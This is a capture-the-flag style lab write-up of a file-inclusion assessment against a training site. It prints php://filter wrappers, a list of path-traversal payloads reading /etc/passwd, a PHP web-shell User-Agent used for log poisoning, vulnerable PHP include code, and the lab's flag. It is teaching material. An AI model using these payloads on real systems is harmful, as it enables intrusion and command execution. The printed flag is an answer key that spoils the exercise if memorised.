## Scenario

The company`INLANEFREIGHT` has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

Don't forget to think outside the box!

![Pasted image 20250218222640.png](../../../IMAGES/Pasted%20image%2020250218222640.png)

# Initial Reconnaissance
----

When we go into the web application, this is the first thing we can see:

![Pasted image 20250218222741.png](../../../IMAGES/Pasted%20image%2020250218222741.png)

We got `Home`, `About Us`, `Industries` and `Contact`, if we click any of them, we can see the following URL:

![Pasted image 20250218222837.png](../../../IMAGES/Pasted%20image%2020250218222837.png)

It goes formatted like this:

```
http://IP:PORT/index.php?page=page_we_selected
```

So, let's try sending the request to burp to analyze it better:

![Pasted image 20250218223106.png](../../../IMAGES/Pasted%20image%2020250218223106.png)

Let's go with a basic attempt to read `/etc/passwd`, it's very unlikely that this goes through but can help us identify the behavior of the application:

![Pasted image 20250218223214.png](../../../IMAGES/Pasted%20image%2020250218223214.png)

We get `Invalid Input dteected!` error, so, it seems like they've filtered stuff like `....//` to avoid basic LFI, let's test another stuff, for example, php filters, let's try to read `/index.php`:

```
php://filter/read=convert.base64-encode/resource=index
```

![Pasted image 20250218223355.png](../../../IMAGES/Pasted%20image%2020250218223355.png)

And surprisingly, this goes through, let's decode the contents to search for any useful stuff in here:

```html
<!DOCTYPE html>
<html lang="en">
 <head>
 <title>InlaneFreight</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,700,900|Display+Playfair:200,300,400,700"> 
 <link rel="stylesheet" href="fonts/icomoon/style.css">

 <link rel="stylesheet" href="css/bootstrap.min.css">
 <link rel="stylesheet" href="css/magnific-popup.css">
 <link rel="stylesheet" href="css/jquery-ui.css">
 <link rel="stylesheet" href="css/owl.carousel.min.css">
 <link rel="stylesheet" href="css/owl.theme.default.min.css">

 <link rel="stylesheet" href="css/bootstrap-datepicker.css">

 <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">



 <link rel="stylesheet" href="css/aos.css">

 <link rel="stylesheet" href="css/style.css">
 
 </head>
 <body>
 
 <div class="site-wrap">

 <div class="site-mobile-menu">
 <div class="site-mobile-menu-header">
 <div class="site-mobile-menu-close mt-3">
 <span class="icon-close2 js-menu-toggle"></span>
 </div>
 </div>
 <div class="site-mobile-menu-body"></div>
 </div>
 
 <header class="site-navbar py-3" role="banner">

 <div class="container">
 <div class="row align-items-center">
 
 <div class="col-11 col-xl-2">
 <h1 class="mb-0"><a href="index.php" class="text-white h2 mb-0">InlaneFreight</a></h1>
 </div>
 <div class="col-12 col-md-10 d-none d-xl-block">
 <nav class="site-navigation position-relative text-right" role="navigation">

 <ul class="site-menu js-clone-nav mx-auto d-none d-lg-block">
 <li class="active"><a href="index.php">Home</a></li>
 <li><a href="index.php?page=about">About Us</a></li>
 <li><a href="index.php?page=industries">Industries</a></li>
 <li><a href="index.php?page=contact">Contact</a></li>
		<?php 
		 // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
		?>
 </ul>
 </nav>
 </div>


 <div class="d-inline-block d-xl-none ml-md-0 mr-auto py-3" style="position: relative; top: 3px;"><a href="#" class="site-menu-toggle js-menu-toggle text-white"><span class="icon-menu h3"></span></a></div>

 </div>

 </div>
 </div>
 
 </header>

 

 <div class="site-blocks-cover overlay" style="background-image: url(images/hero_bg_1.jpg);" data-aos="fade" data-stellar-background-ratio="0.5">
 <div class="container">
 <div class="row align-items-center justify-content-center text-center">

 <div class="col-md-8" data-aos="fade-up" data-aos-delay="400">
 

 <h1 class="text-white font-weight-light mb-5 text-uppercase font-weight-bold">Worldwide Freight Services</h1>
 <p><a href="#" class="btn btn-primary py-3 px-5 text-white">Get Started!</a></p>

 </div>
 </div>
 </div>
 </div> 

<?php
if(!isset($_GET['page'])) {
 include "main.php";
}
else {
 $page = $_GET['page'];
 if (strpos($page, "..") !== false) {
 include "error.php";
 }
 else {
 include $page . ".php";
 }
}
?>
 <footer class="site-footer">
 <div class="row pt-5 mt-5 text-center">
 <div class="col-md-12">
 <div class="border-top pt-5">
 <p>
 <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
 Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="icon-heart" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank" >Colorlib</a>
 <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
 </p>
 </div>
 </div>
 </footer>
 </div>

 <script src="js/jquery-3.3.1.min.js"></script>
 <script src="js/jquery-migrate-3.0.1.min.js"></script>
 <script src="js/jquery-ui.js"></script>
 <script src="js/popper.min.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script src="js/owl.carousel.min.js"></script>
 <script src="js/jquery.stellar.min.js"></script>
 <script src="js/jquery.countdown.min.js"></script>
 <script src="js/jquery.magnific-popup.min.js"></script>
 <script src="js/bootstrap-datepicker.min.js"></script>
 <script src="js/aos.js"></script>

 <script src="js/main.js"></script>
 
 </body>
</html>

```

We can analyze the behavior, here are some key features:

```ad-important

1. **Unsanitized User Input**: 
 The`page` parameter in`index.php?page=` is used directly in`include $page . ".php";` without proper validation, allowing attackers to inject PHP wrappers.
 
2. **Directory Traversal Check Bypass**: 
 The code checks for`..` using`strpos`, but this doesn't block PHP filter wrappers like`php://filter`.
3. **Admin Panel Access**: 
 The commented-out line`ilf_admin/index.php` suggests an admin section. Attackers can target this path to read admin scripts for credentials or vulnerabilities.
```

![Pasted image 20250218224538.png](../../../IMAGES/Pasted%20image%2020250218224538.png)

So, we found the admin panel, we can try automating the scan to check for LFI vulnerabilities, let's do it:

```
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.248.62:52545/ilf_admin/index.php?log=FUZZ' -ic -c -t 200 -fs 2046
```

We get the following output:

```
..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 157ms]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 321ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2291, Words: 155, Lines: 110, Duration: 480ms]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 621ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 187ms]
../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 243ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 283ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 325ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 323ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 328ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 338ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 370ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 413ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 419ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 418ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 418ms]
../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 417ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 433ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 162ms]
../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 462ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 504ms]
../../../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 550ms]
../../../../../etc/passwd [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 603ms]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3269, Words: 152, Lines: 130, Duration: 831ms]
```

We can test any of this payloads, let's try:

![Pasted image 20250218224640.png](../../../IMAGES/Pasted%20image%2020250218224640.png)

And it indeed works, now, next step we need to do is log poisoning, we need to change the `User-Agent` to this:

```php
<?php system($_GET["cmd"]); ?>
```

Now, let's send the request like this:

![Pasted image 20250218225147.png](../../../IMAGES/Pasted%20image%2020250218225147.png)

As seen, it gets logged, in this case, we can see the current directory, let's list the root folder:

![Pasted image 20250218225233.png](../../../IMAGES/Pasted%20image%2020250218225233.png)

Found our flag, let's read it now:

![Pasted image 20250218225409.png](../../../IMAGES/Pasted%20image%2020250218225409.png)

Our flag is:

```
a9a892dbc9faf9a014f58e007721835e
```


![Pasted image 20250218225450.png](../../../IMAGES/Pasted%20image%2020250218225450.png)

